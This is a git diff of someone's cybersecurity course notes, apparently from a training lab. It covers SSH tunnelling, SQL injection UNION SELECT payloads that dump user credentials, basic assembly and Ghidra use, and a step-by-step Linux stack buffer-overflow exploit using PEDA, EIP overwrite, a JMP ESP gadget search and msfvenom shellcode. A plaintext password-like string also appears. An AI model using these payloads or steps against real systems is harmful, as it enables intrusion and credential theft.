@@ -25,9 +25,9 @@ ssh -S /tmp/jump -O cancel -D 9050 dummy  --- DYNO port
 
 
 ssh -S /tmp/jump -O forward -L1111:10.100.28.40:80 DUMB
-ssh -S /tmp/jump -O forward -L2222:192.168.28.111:8080 DUMB
-ssh -S /tmp/jump -O forward -L3333:192.168.28.111:2222 DUMB
-ssh -MS /tmp/T1 student@127.0.0.1 -p3333
+ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
+ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
+ssh -MS /tmp/T1 student@127.0.0.1 -p10100
 
 1243ASDFasdf!!!!
 ## NMAP scanning
@@ -177,6 +177,161 @@ Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
 ?Selection=2 UNION SELECT username,studentID,passwd FROM session.userinfo;#
 
 ?category=1 UNION SELECT username,password,permission FROM sqlinjection.members;#
+
+
+
+# REVERSE ENGINEERING ---IDA GHIDRA
+MOV                  -----------lea is fancy MOV
+move source to destination
+PUSH
+push source onto stack
+POP
+Pop top of stack to destination
+INC
+Increment source by 1
+DEC
+Decrement source by 1
+ADD
+Add source to destination
+SUB
+Subtract source from destination
+CMP
+Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+JMP
+Jump to specified location
+JLE
+Jump if less than or equal
+JE
+Jump if equal
+
+
+### ASSEMBLY 
+```
+main:
+    mov rax, 16
+    push rax
+    jmp mem2
+    
+mem1:
+    mov rax, 0
+    ret
+    
+mem2:
+    pop r8
+    cmp rax, r8
+    je mem1
+```
+**MAIN IS ALWAYS A GOOD PLACE TO START**
+```
+main:
+    lea rcx, 25
+    lea rbx, 62
+    jmp mem1
+    
+mem1:
+    sub rbx, 40
+    lea rsi, rbx
+    cmp rcx, rsi
+    jnz mem2
+    jmp mem3
+
+mem2:
+    lea rax, 1
+    ret
+
+mem3:
+    lea rax, 0
+    ret
+```
+
+**DEMO**
+
+use ghidra
+inport file 
+auto analyze file 
+search string using toolbar 
+find the functions it uses to get input 
+
+
+
+# EXPLOIT DEV
+GDP
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+
+run the process
+**Interacting with process**
+USER INPUT (Enter a number:    )
+PARAMETER  (mv {}              )
+
+run <<< $(python lin_buff.py) -------Triple carrots for user input
+run $(python lin_buff.py)     -------No carrots for parameters
+
+
+
+
+**IS IT OVERFLOWABLE?**
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+**PEDA IS ONLY ON LINUX-OPSTATION**
+pdisass
+### PROCESS
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/ ------get buffer pattern from site
+ 
+GDB {FILE}
+
+```
+overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac    7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9    Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+print(overflow)
+```
+run <<< $(python lin_buff.py) 
+
+**EDIT SCRIPT**
+overflow = "A" * 62
+eip = "B" * 4
+print(overflow + eip)
+
+
+script must be on local machine, put it in /tmp
+
+-----------------------------------
+which gdb
+if gdb is installed on the box then do buffer overflow
+if it is not installed on the box you arent gunna do buffer overflow
+
+env - gdb func
+unset env LINES
+unset env COLUMNS              -------THIS PROCESS MUST BE DONE ON THE ADVERSARY
+run
+info proc map
+
+------------------------------------
+get the line directly below heap
+get the line directly above stack
+
+                              JMP  ESP
+find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
+
+msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+
+**TROUBLESHOOTING**
+run as sudo
+generate new shellcode
+change to new eip
+
+
+scp the executable to the our machine.
+
+
+
+
+
+
+
 
 
 
